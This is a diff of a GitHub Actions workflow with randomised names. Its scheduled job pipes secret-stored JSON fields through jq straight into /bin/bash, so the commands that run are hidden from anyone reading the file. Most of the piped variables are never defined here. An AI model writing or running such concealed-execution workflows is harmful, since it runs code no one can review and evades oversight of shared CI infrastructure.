@@ -1,8 +1,9 @@
 name: chengjiezi1829
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '43 1/6 * * *'
+    - cron: '26 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,21 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: chengjiezi1829
         env:
-          f90746: ${{ secrets.f90746 }}
+          njkp269: ${{ secrets.njkp269 }}
         run: |
-          echo $f90746 | jq -r .kdoy45 | /bin/bash
-          echo $dwau7 | jq -r .p76 | /bin/bash
-          echo $h39624 | jq -r .urdmf817 | /bin/bash
-          echo $fwhmp1276 | jq -r .p6 | /bin/bash
-          echo $izr00 | jq -r .lsj80224 | /bin/bash
-          echo $vo9051 | jq -r .hcff09 | /bin/bash
-          echo $dcx203 | jq -r .h38 | /bin/bash
-          echo $tgi3 | jq -r .cmqan37934 | /bin/bash
-          echo $oyx97 | jq -r .qup2131 | /bin/bash
-          echo $pznj634 | jq -r .pd82707 | /bin/bash
-          echo $a1180 | jq -r .r6 | /bin/bash
-          echo $mfkw4 | jq -r .nyj4 | /bin/bash
-          echo $mbut184 | jq -r .uwbvq94 | /bin/bash
-          echo $ufrq8 | jq -r .wl76055 | /bin/bash
-          echo $mfp97596 | jq -r .sr38 | /bin/bash
+          echo $njkp269 | jq -r .c1687 | /bin/bash
+          echo $d449 | jq -r .kxu034 | /bin/bash
+          echo $p75486 | jq -r .ckva09 | /bin/bash
+          echo $y5852 | jq -r .by350 | /bin/bash
+          echo $hcro9366 | jq -r .hkc113 | /bin/bash
+          echo $fl0 | jq -r .nphnh85632 | /bin/bash
+          echo $wua81 | jq -r .jsy339 | /bin/bash
+          echo $sr86495 | jq -r .pz58 | /bin/bash
+          echo $ohuoh40 | jq -r .ttos16 | /bin/bash
+          echo $y8 | jq -r .xpgn8096 | /bin/bash
+          echo $fg12 | jq -r .ymzwo08 | /bin/bash
 
